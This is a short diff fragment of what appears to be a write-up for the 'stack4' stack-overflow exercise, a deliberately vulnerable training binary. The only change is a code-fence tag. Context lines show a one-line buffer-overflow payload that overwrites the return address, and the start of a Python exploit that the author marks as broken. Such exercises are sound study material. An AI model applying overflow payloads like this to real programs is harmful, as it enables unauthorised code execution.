@@ -417,7 +417,7 @@ python -c "print 'a'*76+'\xf4\x83\x04\x08'" | ./stack4
 
 ### Python exploit:  (BROKEN, need to figure out why popen isnt working)
 
-```Python
+```python
 from subprocess import Popen, PIPE
 import os
 ################
